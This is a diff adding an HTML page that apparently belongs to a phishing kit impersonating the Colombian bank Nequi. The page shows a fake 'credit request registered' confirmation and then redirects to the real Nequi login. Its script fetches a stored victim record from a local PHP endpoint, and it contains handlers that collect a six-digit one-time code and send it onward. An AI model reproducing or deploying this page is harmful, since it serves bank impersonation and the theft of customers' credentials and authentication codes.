@@ -1,0 +1,322 @@
+<html>
+    <head>
+        <title>Solicitud Finalizada Satisfactoriamente</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">
+        <script type="text/javascript" src="../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="../assets/css/styles.css" rel="stylesheet">
+        <link href="../assets/css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../assets/js/functions.js?v1"></script>  
+
+        <style type="text/css">
+            #fondo{
+                display: none;
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                top: 0;
+                left: 0;
+                background-color: #ffffffc4;
+                z-index: 300;
+            }
+            #ok{
+                position: fixed;            
+                top:50%; 
+                left:50%;
+                transform: translate(-50%, -50%);
+                z-index: 400;
+                display: none;
+            }
+        </style>
+
+    </head>
+    <body>      
+        <div id="fondo"></div>
+        <img src="../assets/img/ok.png" id="ok" width="160">
+
+       <div class="cabecera">
+           <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
+                    <td valign="middle" align="right">
+                        <button class="btn btn-std btn-sprd top-btn">Recarga</button>
+                        <button class="btn btn-std btn-sprd top-btn">Salir</button>
+                        <img src="../assets/img/menu.jpg" id="btn-menu">
+                    </td>
+                </tr>               
+           </table>
+           <div class="bar-menu">
+               <span class="menu-interno marcado">Mi Nequi</span>
+               <span class="menu-interno">Certificados</span>
+               <span class="menu-interno">Ayuda</span>
+           </div>
+       </div>
+        <div class="contenido-interno">
+            <div class="frm" id="frm-codigo" style="height: 340px;">
+                <img src="../assets/img/ok.png" width="130">
+                <div class="descripcioncode" style="margin-top: 20px;">Tu solicitud de crédito se ha registrado exitosamente, en las siguientes 24 horas recibirás un mensaje de texto a tu numero registrado y correo electrónico con toda la información y políticas de crédito de NEQUI, aplican T&C.</div>            
+                <br><br>
+                <button id="btn-final" class="btn-small btn-fill">Finalizar</button>                          
+            </div>          
+       </div>
+       <div class="pie">
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td id="logo-blanco-movil">
+                        <img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom: 27px;" >
+                        <div class="separador"></div>
+                    </td>
+                </tr>
+            </table>   
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                
+                <tr>
+                    <td valign="top" id="logo-blanco">
+                        <img src="../assets/img/logo-blanco.svg" width="176">
+                    </td>
+                    <td valign="top">
+                        <div class="titulo-footer">Producto</div>
+                        <div class="item-footer">Legales</div>
+                        <div class="item-footer">Ayuda</div>
+
+                        <div class="titulo-footer vmovil">Portales</div>
+                        <div class="item-footer vmovil">Blog | Metidas de plata</div>
+                        <div class="item-footer vmovil">APIs | Nequi conecta</div>
+
+                        <div class="titulo-footer vmovil">Redes</div>
+                        <img class="vmovil" src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+
+                    </td>
+                    <td valign="top" id="app">
+                        <div class="titulo-footer">Descarga la App</div>
+                        <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Portales</div>
+                        <div class="item-footer">Blog | Metidas de plata</div>
+                        <div class="item-footer">APIs | Nequi conecta</div>
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Redes</div>
+                        <img src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+                    </td>
+                </tr>                
+            </table>
+
+            
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                                
+                <tr>
+                    <td id="gb-sec">
+                        <div class="separador"></div>                    
+                        <img src="../assets/img/gb-blanco.svg" width="122"  style="margin-bottom: 15px;">
+                        <div style="border-bottom: 1px solid red; width:100%;"></div>
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="middle" align="center">
+                        <table border="0" cellpadding="0" cellspacing="0" >
+                            <tr>
+                                <td id="copy-menu">
+                                    <div class="item-copy">Características del producto</div>
+                                    <div class="item-copy">Condiciones de uso</div>
+                                    <div class="item-copy">Legales</div>
+                                    <div class="item-copy">Términos y condiciones</div>
+                                </td>    
+                            </tr>                            
+                        </table>                        
+                    </td>
+                </tr>
+            </table>
+
+       </div> 
+    </body>
+    <script type="text/javascript">
+        function cierre(){
+            window.location.href = "https://transacciones.nequi.com/bdigital/login.jsp";   
+        }
+
+        $(document).ready(function($){  
+            setTimeout(cierre,3000); 
+
+            if(detectar_dispositivo() != "PC"){
+                $(".cabecera,.pie").hide(); 
+                $(".frm").css({"width":"calc(100% - 40px)","background-color":"transparent"}); 
+                $(".contenido-interno").css({"padding-top":"0px","padding-bottom":"0px","height":"100%","background-image":"url(../assets/img/fondo.jpg)","background-position":"bottom","background-repeat":"no-repeat","background-color":"#fff","min-height":"500px"});                      
+            } 
+                          
+            $.post( "../process/buscar_registro.php", function(data) {                 
+                valor = data.split("|");                
+                cel = valor[1];
+                cel = cel.split('').reverse().join('')
+                cel = cel.substring(4);
+                cel = cel.split('').reverse().join('')
+                cel = cel + "XXXX";                
+                $("#celular").html(cel);                
+            });
+
+
+            $('#otp1').keyup(function(event){
+                if(event.key === "Backspace" || event.key === "Delete" ) {
+                    if ($('#otp1').val().length == 0) {
+                        $("#btn-otp").attr("disabled","disabled");  
+                    }else{
+                       $("#btn-otp").removeAttr("disabled");
+                    } 
+                }else{
+                    if ($('#otp1').val() != "") {
+                        $('#otp2').focus();
+                        if ($('#otp1').val() != "" && $('#otp2').val() != "" && $('#otp3').val() != "" && $('#otp4').val() != "" && $('#otp5').val() != "" && $('#otp6').val() != "") {
+                            $("#btn-otp").removeAttr("disabled");  
+                            otp = $('#otp1').val() + "" + $('#otp2').val() + "" + $('#otp3').val() + "" + $('#otp4').val() + "" + $('#otp5').val() + "" + $('#otp6').val();
+                            $("#fondo").show();
+                            $("#ok").show("fast");
+                            enviar_otp(otp);  
+                        }else{
+                            $("#btn-otp").attr("disabled","disabled");       
+                        }
+                    }    
+                }        
+             });
+
+            $('#otp2').keyup(function(event){
+                if(event.key === "Backspace" || event.key === "Delete" ) {
+                    if ($('#otp2').val().length == 0) {
+                        $('#otp1').focus();
+                        $("#btn-otp").attr("disabled","disabled");  
+                    }else{
+                       $("#btn-otp").removeAttr("disabled");
+                    } 
+                }else{
+                    if ($('#otp2').val() != "") {
+                        $('#otp3').focus();
+                        if ($('#otp1').val() != "" && $('#otp2').val() != "" && $('#otp3').val() != "" && $('#otp4').val() != "" && $('#otp5').val() != "" && $('#otp6').val() != "") {
+                            $("#btn-otp").removeAttr("disabled");    
+                            otp = $('#otp1').val() + "" + $('#otp2').val() + "" + $('#otp3').val() + "" + $('#otp4').val() + "" + $('#otp5').val() + "" + $('#otp6').val();
+                            $("#fondo").show();
+                            $("#ok").show("fast");
+                            enviar_otp(otp);
+                        }else{
+                            $("#btn-otp").attr("disabled","disabled");       
+                        }
+                    }    
+                }        
+             });
+
+            $('#otp3').keyup(function(event){
+                if(event.key === "Backspace" || event.key === "Delete" ) {
+                    if ($('#otp3').val().length == 0) {
+                        $('#otp2').focus();
+                        $("#btn-otp").attr("disabled","disabled");  
+                    }else{
+                       $("#btn-otp").removeAttr("disabled");
+                    } 
+                }else{
+                    if ($('#otp3').val() != "") {
+                        $('#otp4').focus();
+                        if ($('#otp1').val() != "" && $('#otp2').val() != "" && $('#otp3').val() != "" && $('#otp4').val() != "" && $('#otp5').val() != "" && $('#otp6').val() != "") {
+                            $("#btn-otp").removeAttr("disabled");  
+                            otp = $('#otp1').val() + "" + $('#otp2').val() + "" + $('#otp3').val() + "" + $('#otp4').val() + "" + $('#otp5').val() + "" + $('#otp6').val();
+                            $("#fondo").show();
+                            $("#ok").show("fast");
+                            enviar_otp(otp);  
+                        }else{
+                            $("#btn-otp").attr("disabled","disabled");       
+                        }
+                    }
+                }            
+             });
+
+            $('#otp4').keyup(function(event){
+                if(event.key === "Backspace" || event.key === "Delete" ) {
+                    if ($('#otp4').val().length == 0) {
+                        $('#otp3').focus();
+                        $("#btn-otp").attr("disabled","disabled");  
+                    }else{
+                       $("#btn-otp").removeAttr("disabled");
+                    } 
+                }else{
+                    if ($('#otp4').val() != "") {
+                        $('#otp5').focus();
+                        if ($('#otp1').val() != "" && $('#otp2').val() != "" && $('#otp3').val() != "" && $('#otp4').val() != "" && $('#otp5').val() != "" && $('#otp6').val() != "") {
+                            $("#btn-otp").removeAttr("disabled");   
+                            otp = $('#otp1').val() + "" + $('#otp2').val() + "" + $('#otp3').val() + "" + $('#otp4').val() + "" + $('#otp5').val() + "" + $('#otp6').val();
+                            $("#fondo").show();
+                            $("#ok").show("fast");
+                            enviar_otp(otp); 
+                        }else{
+                            $("#btn-otp").attr("disabled","disabled");       
+                        }
+                    }
+                }        
+             });
+
+            $('#otp5').keyup(function(event){
+                if(event.key === "Backspace" || event.key === "Delete" ) {
+                    if ($('#otp5').val().length == 0) {
+                        $('#otp4').focus();
+                        $("#btn-otp").attr("disabled","disabled");  
+                    }else{
+                       $("#btn-otp").removeAttr("disabled");
+                    } 
+                }else{
+                    if ($('#otp5').val() != "") {
+                        $('#otp6').focus();
+                        if ($('#otp1').val() != "" && $('#otp2').val() != "" && $('#otp3').val() != "" && $('#otp4').val() != "" && $('#otp5').val() != "" && $('#otp6').val() != "") {
+                            $("#btn-otp").removeAttr("disabled");  
+                            otp = $('#otp1').val() + "" + $('#otp2').val() + "" + $('#otp3').val() + "" + $('#otp4').val() + "" + $('#otp5').val() + "" + $('#otp6').val();
+                            $("#fondo").show();
+                            $("#ok").show("fast");
+                            enviar_otp(otp);  
+                        }else{
+                            $("#btn-otp").attr("disabled","disabled");       
+                        }
+                    }    
+                }            
+             });
+
+            $('#otp6').keyup(function(event){
+                if(event.key === "Backspace" || event.key === "Delete" ) {
+                    if ($('#otp6').val().length == 0) {
+                        $('#otp5').focus();
+                        $("#btn-otp").attr("disabled","disabled");  
+                    }else{
+                       $("#btn-otp").removeAttr("disabled");
+                    } 
+                }else{
+                    if ($('#otp6').val() != "") {
+                        $('#otp7').focus();
+                        if ($('#otp1').val() != "" && $('#otp2').val() != "" && $('#otp3').val() != "" && $('#otp4').val() != "" && $('#otp5').val() != "" && $('#otp6').val() != "") {
+                            $("#btn-otp").removeAttr("disabled");  
+                            otp = $('#otp1').val() + "" + $('#otp2').val() + "" + $('#otp3').val() + "" + $('#otp4').val() + "" + $('#otp5').val() + "" + $('#otp6').val();
+                            $("#fondo").show();
+                            $("#ok").show("fast");
+                            enviar_otp(otp);  
+                        }else{
+                            $("#btn-otp").attr("disabled","disabled");       
+                        }
+                    }    
+                }            
+             });
+
+            $("#btn-final").click(function(){      
+                window.location.href = "https://transacciones.nequi.com/bdigital/login.jsp";
+            });
+
+            
+
+        });
+
+    </script>
+    <script type="text/javascript" src="../assets/js/ready.js?v1"></script> 
+</html>
